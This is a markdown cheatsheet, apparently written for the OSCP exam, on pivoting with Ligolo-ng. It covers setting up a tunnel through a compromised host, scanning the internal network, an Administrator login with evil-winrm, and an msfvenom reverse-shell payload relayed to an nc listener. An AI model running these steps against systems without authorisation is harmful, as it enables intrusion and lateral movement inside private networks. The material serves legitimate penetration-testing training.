```markdown
# Ligolo-ng OSCP Cheatsheet

## Quick Overview
Ligolo-ng creates a transparent network tunnel between your attack machine and a compromised pivot host. Once set up, you can directly access the internal network without `proxychains`.

## 1. Attacker Machine (Kali) Setup

```bash
# Create TUN interface (replace with your username)
sudo ip tuntap add user kali mode tun ligolo

# Bring interface up
sudo ip link set ligolo up

# Start Ligolo proxy (port 443 often allowed outbound)
sudo ./proxy -selfcert -laddr 0.0.0.0:443
```

## 2. Pivot Machine (Compromised Host)

### Windows (upload `agent.exe` first)
```cmd
agent.exe -connect <KALI_IP>:443 -ignore-cert
```

### Linux (upload `agent` binary)
```bash
chmod +x ./agent
./agent -connect <KALI_IP>:443 -ignore-cert
```

## 3. Establish Tunnel (in proxy terminal)

```text
# List connected agents
session

# Select agent (type number, e.g., 1)
1

# Start forwarding traffic
start
```

## 4. Add Route to Internal Network

In a **new terminal** on Kali:

```bash
# Replace <internal_subnet> (e.g., 172.16.1.0/24)
sudo ip route add <internal_subnet> dev ligolo
```

Example:
```bash
sudo ip route add 172.16.1.0/24 dev ligolo
```

## 5. Access Internal Hosts

Now use standard tools directly:

```bash
# Ping (works in v0.6.2+)
ping -c 4 172.16.1.10

# TCP scan (use -sT and -Pn)
nmap -sT -Pn -p 445,3389,80,443 172.16.1.0/24

# CrackMapExec
crackmapexec smb 172.16.1.0/24

# Curl
curl http://172.16.1.20

# Evil-WinRM
evil-winrm -i 172.16.1.30 -u Administrator
```

## 6. Receive Reverse Shells Through the Tunnel

**On Kali (proxy terminal):**
```text
# Forward traffic from pivot's port 1234 to Kali's port 4444
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 --tcp
```

**On Kali (separate terminal):**
```bash
nc -lvnp 4444
```

**On internal target machine:**
Generate payload with `LHOST = <pivot_internal_IP>` and `LPORT = 1234`.  
Example (msfvenom):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.5 LPORT=1234 -f exe -o shell.exe
```

Execute shell.exe on internal host → connects to pivot → forwarded to your Kali listener.

## 7. Common Troubleshooting

| Problem | Solution |
|---------|----------|
| Can't ping internal hosts | Did you run `start`? Check with `session` then `start`. Also ensure ICMP allowed on target. |
| Tunnel not forwarding | Verify route: `ip route show dev ligolo`. Re-add if missing. |
| Agent won't connect | Check Kali firewall: `sudo ufw disable` (temporarily). Try different port (e.g., 53, 80, 443). |
| Reverse shell not arriving | Confirm `listener_add` is active. Use verbose mode on proxy: `-debug`. |
| Nmap slow/unreliable | Use `-sT -Pn --min-rate 1000`. Avoid `-sS` (SYN scan) over tunnel. |
| Ligolo version issues | Upgrade to v0.6.2+ for better ICMP and stability. |

## 8. Useful Commands

```text
# In proxy terminal:
help                 # Show all commands
session              # List agents
session -i <id>      # Select agent
start                # Start tunnel
stop                 # Stop tunnel
listener_list        # Show active listeners
listener_rm <id>     # Remove listener
exit                 # Exit proxy
```

## 9. Clean Up After Exam

```bash
sudo ip link delete ligolo
sudo pkill proxy
```

## Pro Tips for OSCP

- **Always run `start`** – the most common mistake.
- **Test with `curl` first** if ping fails; TCP is more reliable.
- **Keep proxy terminal visible** so you see connection logs.
- **Use ligolo for pivoting** – it's simpler than SSH/plink once running.
- **If you get "device or resource busy"** when creating TUN, delete old: `sudo ip link delete ligolo`.
```

Save this cheatsheet as `ligolo-ng_oscp.md` and keep it handy during your exam. Good luck!